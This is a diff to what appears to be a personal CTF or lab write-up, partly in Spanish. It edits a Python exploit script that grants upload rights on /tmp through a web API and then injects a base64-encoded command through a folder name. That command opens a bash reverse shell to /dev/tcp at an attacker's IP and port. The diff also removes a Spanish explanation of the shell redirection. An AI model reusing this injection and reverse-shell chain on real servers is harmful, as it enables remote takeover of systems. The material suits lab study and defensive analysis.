@@ -508,7 +508,7 @@ print("Step 2 set permission vfs")
 step2 = req.post(url+"~/api/set_vfs", headers=headers, json={"uri":"/tmp/","props":{"can_see":None,"can_read":None,"can_list":None,"can_upload":"*","can_delete":None,"can_archive":None,"source":"/tmp","name":"tmp","type":"folder","masks":None}})
 
 print("Step 3 create folder")
-command = "bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} <&1'".format(ip,port)
+command = "bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} 0<&1'".format(ip,port)
 command = command.encode('utf-8')
 payload = 'poc";python3 -c "import os;import base64;os.system(base64.b64decode(\''+base64.b64encode(command).decode('utf-8')+"'))"
 step3 = req.post(url+"~/api/create_folder", headers=headers, json={"uri":"/tmp/","name":payload})
@@ -517,15 +517,7 @@ print("Step 4 execute payload")
 step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
 ```
 
-### Explicación de los cambios:
-
-`"bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} <&1 &'"`
-
-- `>& /dev/tcp/{0}/{1}`: Esto redirige la salida estándar y la salida de error estándar al socket TCP.
-- `<&0`: Esto redirige la entrada estándar (`stdin`) al socket TCP. En este caso, `<&0` especifica que la entrada estándar debe ser utilizada para el flujo de entrada.
-- `Nota` al final agregamos un `&` mas debido a que la web se queda esperando resolver este proceso para saltar al siguiente y con este pequeño cambio podemos hacer que la web siga funcionando correctamente para seguir enumerando
-
-La idea es que conectes la entrada (`stdin`) y la salida (`stdout` y `stderr`) al mismo socket TCP para que la shell interactiva funcione correctamente. Este comando ahora debería permitir la comunicación completa entre el atacante y el shell en la máquina objetivo.
+### reverse shelll
 
 ![[Pasted image 20240908160423.png]]
 
